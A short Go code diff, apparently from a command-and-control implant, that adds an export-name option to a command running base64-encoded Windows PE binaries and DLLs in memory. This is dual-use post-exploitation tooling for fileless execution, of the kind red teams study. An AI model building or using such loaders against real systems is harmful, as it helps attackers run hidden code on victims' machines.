@@ -19,9 +19,10 @@ import (
 // executeMemoryArgs is shared with execute_memory_linux.go and execute_memory_darwin.go
 // (duplicated due to build tags).
 type executeMemoryArgs struct {
-	BinaryB64 string `json:"binary_b64"` // base64-encoded PE binary
-	Arguments string `json:"arguments"`  // command-line arguments (space-separated)
-	Timeout   int    `json:"timeout"`    // execution timeout in seconds (default: 60)
+	BinaryB64  string `json:"binary_b64"`  // base64-encoded PE binary
+	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
+	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
+	ExportName string `json:"export_name"` // (Windows DLLs) export function to call after DllMain
 }
 
 // ExecuteMemoryCommand executes a PE binary in memory on Windows.
@@ -77,7 +78,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	}
 
 	// Try in-memory execution first (native EXE or DLL)
-	output, err := peLoaderExec(binaryData, args.Arguments, timeout)
+	output, err := peLoaderExec(binaryData, args.Arguments, timeout, args.ExportName)
 	if err == nil {
 		if output == "" {
 			output = fmt.Sprintf("[+] PE executed in-memory successfully (%d bytes, no output)", len(binaryData))
